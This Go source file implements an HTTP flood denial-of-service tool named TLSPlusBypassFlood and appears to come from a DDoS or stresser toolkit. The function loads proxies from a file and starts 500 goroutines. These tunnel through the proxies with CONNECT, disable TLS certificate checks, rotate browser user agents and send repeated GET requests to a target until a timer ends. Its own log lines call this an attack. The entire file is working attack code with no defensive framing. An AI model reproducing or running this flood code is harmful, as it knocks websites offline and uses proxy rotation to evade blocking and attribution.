package methods

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var tlsProxies []string // Load proxies from file

func loadTLSProxies() {
	file, err := os.Open("proxy/tlsplusbypass.txt")
	if err != nil {
		return
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") && strings.Contains(line, ":") {
			line = strings.TrimPrefix(line, "http://")
			line = strings.TrimPrefix(line, "https://")
			lines = append(lines, line)
		}
	}
	tlsProxies = lines
	fmt.Printf("Loaded %d proxies for TLSPlusBypass\n", len(tlsProxies))
}

// TLSPlusBypassFlood - High Performance Raw Socket Flood (with Proxy support)
func TLSPlusBypassFlood(ctx context.Context, target string, sec int) {
	loadTLSProxies()

	u, err := url.Parse(target)
	if err != nil {
		fmt.Printf("Failed to parse URL: %v\n", err)
		return
	}

	host := u.Host
	if !strings.Contains(host, ":") {
		host += ":443"
	}

	fmt.Printf("[%s] TLS+ Bypass (Enhanced Raw) Attack started on %s for %ds\n",
		time.Now().Format("15:04:05"), target, sec)

	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	}

	path := u.Path
	if path == "" {
		path = "/"
	}

	var mu sync.Mutex
	var proxyIndex int = 0
	var proxyUsage int = 0

	for i := 0; i < 500; i++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				var conn net.Conn
				var err error

				if len(tlsProxies) > 0 {
					mu.Lock()
					proxyStr := tlsProxies[proxyIndex]
					proxyUsage++
					if proxyUsage >= 10 { // Slightly higher usage per proxy to reduce lock contention
						proxyUsage = 0
						proxyIndex = (proxyIndex + 1) % len(tlsProxies)
					}
					mu.Unlock()

					var proxyAddr string
					var authHeader string

					if strings.Contains(proxyStr, "@") {
						parts := strings.SplitN(proxyStr, "@", 2)
						creds := parts[0]
						proxyAddr = parts[1]
						basicAuth := base64.StdEncoding.EncodeToString([]byte(creds))
						authHeader = fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", basicAuth)
					} else {
						proxyAddr = proxyStr
					}

					conn, err = net.DialTimeout("tcp", proxyAddr, 5*time.Second)
					if err != nil {
						continue
					}

					connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n%s\r\n", host, host, authHeader)
					conn.Write([]byte(connectReq))

					tmp := make([]byte, 1024)
					conn.SetReadDeadline(time.Now().Add(5 * time.Second))
					_, err = conn.Read(tmp)
					if err != nil || !strings.Contains(string(tmp), "200") {
						conn.Close()
						continue
					}
					tlsConn := tls.Client(conn, &tls.Config{
						InsecureSkipVerify: true,
						ServerName:         u.Host,
						MinVersion:         tls.VersionTLS12,
					})
					conn = tlsConn
				} else {
					conn, err = tls.Dial("tcp", host, &tls.Config{
						InsecureSkipVerify: true,
						ServerName:         u.Host,
						MinVersion:         tls.VersionTLS12,
					})
					if err != nil {
						time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
						continue
					}
				}

				// Generate randomized payload
				agent := agents[rand.Intn(len(agents))]
				payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nCache-Control: no-cache\r\n\r\n",
					path, u.Host, agent)
				payloadBytes := []byte(payload)

				for {
					select {
					case <-ctx.Done():
						conn.Close()
						return
					default:
					}

					conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
					_, err := conn.Write(payloadBytes)
					if err != nil {
						break
					}
					time.Sleep(time.Duration(rand.Intn(20)) * time.Millisecond)
				}
				conn.Close()
			}
		}()
	}

	<-ctx.Done()
	fmt.Printf("[%s] TLS+ Bypass Attack finished.\n", time.Now().Format("15:04:05"))
}
